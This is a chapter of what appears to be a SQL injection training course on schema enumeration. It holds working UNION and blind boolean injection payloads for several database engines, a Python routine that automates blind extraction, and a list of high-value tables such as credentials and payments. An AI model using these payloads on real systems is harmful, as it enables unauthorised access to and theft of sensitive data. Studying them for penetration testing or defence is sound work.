# 06 - Schema Enumeration

## Understanding Database Schema

Schema = database structure that contains:

- Database names
- Table names
- Column names
- Data types
- Relationships

**Enumerate schema = roadmap to sensitive data**

## System Tables Overview

| Database       | System Table                 | Contains          |
| -------------- | ---------------------------- | ----------------- |
| **MySQL**      | `information_schema.tables`  | All tables        |
| **MySQL**      | `information_schema.columns` | All columns       |
| **PostgreSQL** | `pg_catalog.pg_tables`       | Tables            |
| **PostgreSQL** | `information_schema.columns` | Columns           |
| **MSSQL**      | `sys.tables`                 | Tables            |
| **MSSQL**      | `sys.columns`                | Columns           |
| **Oracle**     | `all_tables`                 | Accessible tables |
| **Oracle**     | `all_tab_columns`            | Columns           |
| **SQLite**     | `sqlite_master`              | Schema info       |

## MySQL Schema Enumeration

### List All Databases

```sql
-- Direct query
SELECT schema_name FROM information_schema.schemata

-- Union extraction
UNION SELECT 1,schema_name,3 FROM information_schema.schemata

-- All in one (group_concat)
UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata
```

### List Tables in Current Database

```sql
-- Basic table list
SELECT table_name FROM information_schema.tables
WHERE table_schema=database()

-- Union extraction
UNION SELECT 1,table_name,3 FROM information_schema.tables
WHERE table_schema=database()

-- Multiple tables (comma-separated)
UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables
WHERE table_schema=database()

-- Filter by table type (exclude system tables)
UNION SELECT 1,table_name,3 FROM information_schema.tables
WHERE table_schema=database() AND table_type='BASE TABLE'
```

### List All Columns in a Table

```sql
-- Columns from specific table
SELECT column_name FROM information_schema.columns
WHERE table_schema=database() AND table_name='users'

-- With data types
SELECT concat(column_name,':',data_type) FROM information_schema.columns
WHERE table_schema=database() AND table_name='users'

-- Union extraction
UNION SELECT 1,column_name,3 FROM information_schema.columns
WHERE table_schema=database() AND table_name='users'

-- All columns at once
UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns
WHERE table_schema=database() AND table_name='users'
```

### Complete Schema Dump

```sql
-- All tables and their columns
SELECT
  table_name,
  group_concat(column_name ORDER BY ordinal_position)
FROM information_schema.columns
WHERE table_schema=database()
GROUP BY table_name
```

## PostgreSQL Schema Enumeration

### List Databases

```sql
SELECT datname FROM pg_database WHERE datistemplate=false
```

### List Tables

```sql
-- Current database tables
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- Or use information_schema
SELECT table_name FROM information_schema.tables
WHERE table_schema='public' AND table_type='BASE TABLE'
```

### List Columns

```sql
SELECT column_name,data_type
FROM information_schema.columns
WHERE table_schema='public' AND table_name='users'
```

### Schema with System Catalog

```sql
-- Detailed column info
SELECT
  a.attname as column_name,
  pg_catalog.format_type(a.atttypid, a.atttypmod) as data_type
FROM pg_catalog.pg_attribute a
WHERE a.attrelid = (SELECT c.oid FROM pg_catalog.pg_class c
                    WHERE c.relname='users')
  AND a.attnum > 0
  AND NOT a.attisdropped
```

## MSSQL Schema Enumeration

### List Databases

```sql
SELECT name FROM master..sysdatabases
```

### List Tables

```sql
-- Current database
SELECT name FROM sys.tables

-- With schema
SELECT SCHEMA_NAME(schema_id),name FROM sys.tables

-- Via information_schema
SELECT table_name FROM information_schema.tables
WHERE table_type='BASE TABLE'
```

### List Columns

```sql
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')

-- With data types
SELECT
  c.name,
  t.name as data_type
FROM sys.columns c
JOIN sys.types t ON c.user_type_id=t.user_type_id
WHERE c.object_id=OBJECT_ID('users')
```

## Oracle Schema Enumeration

### List Tables (Current User)

```sql
SELECT table_name FROM user_tables

-- All accessible tables
SELECT owner,table_name FROM all_tables
```

### List Columns

```sql
SELECT column_name,data_type FROM user_tab_columns
WHERE table_name='USERS'

-- Or use all_tab_columns for tables from other schemas
SELECT column_name,data_type FROM all_tab_columns
WHERE owner='SCOTT' AND table_name='EMP'
```

### Schema Objects

```sql
-- All objects
SELECT object_name,object_type FROM user_objects
WHERE object_type IN ('TABLE','VIEW','PROCEDURE')

-- With details
SELECT * FROM all_objects WHERE owner='SYSTEM'
```

## SQLite Schema Enumeration

### Master Table

```sql
-- All tables and indices
SELECT name,type,sql FROM sqlite_master WHERE type='table'

-- Columns (pragma)
PRAGMA table_info(users)

-- Or via sql column parsing
SELECT sql FROM sqlite_master WHERE name='users'
```

## Blind Schema Enumeration

### Boolean-Based Table Discovery

```sql
-- Check: Does table 'admin' exist?
' AND (SELECT COUNT(*) FROM information_schema.tables
       WHERE table_schema=database() AND table_name='admin')>0--

-- Check: Does table 'users' exist?
' AND (SELECT COUNT(*) FROM information_schema.tables
       WHERE table_schema=database() AND table_name='users')>0--
```

### Blind Column Enumeration

```sql
-- Check: Does table have column 'password'?
' AND (SELECT COUNT(*) FROM information_schema.columns
       WHERE table_schema=database() AND table_name='users'
       AND column_name='password')>0--

-- Extract first char of table name
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables
       WHERE table_schema=database() LIMIT 1),1,1))=117--
```

### Automating Schema Extraction

```python
def extract_table_names():
    tables = []
    # Get count of tables
    count = extract_number(
        "SELECT COUNT(*) FROM information_schema.tables "
        "WHERE table_schema=database()"
    )
    for i in range(count):
        table_name = extract_string(
            f"SELECT table_name FROM information_schema.tables "
            f"WHERE table_schema=database() LIMIT {i},1"
        )
        tables.append(table_name)
    return tables

def extract_columns(table_name):
    columns = []
    count = extract_number(
        f"SELECT COUNT(*) FROM information_schema.columns "
        f"WHERE table_schema=database() AND table_name='{table_name}'"
    )
    for i in range(count):
        column = extract_string(
            f"SELECT column_name FROM information_schema.columns "
            f"WHERE table_schema=database() AND table_name='{table_name}' "
            f"LIMIT {i},1"
        )
        columns.append(column)
    return columns
```

## Common Table Names to Check

### High-Value Targets

| Table Name             | Likely Contents    |
| ---------------------- | ------------------ |
| users, user_accounts   | User credentials   |
| admin, administrators  | admin credentials  |
| customers, clients     | Customer data      |
| orders, transactions   | Financial data     |
| passwords, credentials | Password storage   |
| sessions, tokens       | Session management |
| config, settings       | Configuration      |
| email, messages        | Communication data |
| credit_cards, payments | Financial info     |
| logs, audit_logs       | Activity logs      |

### Blind Table Guessing

```sql
-- Test common names one per one
' AND (SELECT COUNT(*) FROM information_schema.tables
       WHERE table_name='users')>0--

' AND (SELECT COUNT(*) FROM information_schema.tables
       WHERE table_name='admin')>0--

' AND (SELECT COUNT(*) FROM information_schema.tables
       WHERE table_name LIKE '%user%')>0--
```

## Practice Exercises

### Exercise 1: Table Discovery

Target: `http://target.com/page?id=1`

Enumerate all table names in current database using union injection.

### Exercise 2: Column Mapping

From table `users` already identified, extract all column names and data types.

### Exercise 3: Blind Schema

Scenario: Union injection not available. Use blind boolean extraction for:

1. Count how many tables
2. Extract table names
3. Extract columns from each table

### Exercise 4: Cross-database

Enumerate schema from database `mysql` (system database) to find user credentials.

## Schema Enumeration Checklist

- [ ] Identify database type
- [ ] List all databases (if privileges allow)
- [ ] List all tables in target database
- [ ] Identify high-value tables (users, admin, etc.)
- [ ] Extract columns from each interesting table
- [ ] Map data types to understand storage
- [ ] Document schema for next stage (data extraction)

## Next Step

Continue to [07 - Data Extraction](07-Data-Extraction.md) to dump actual data from identified tables.
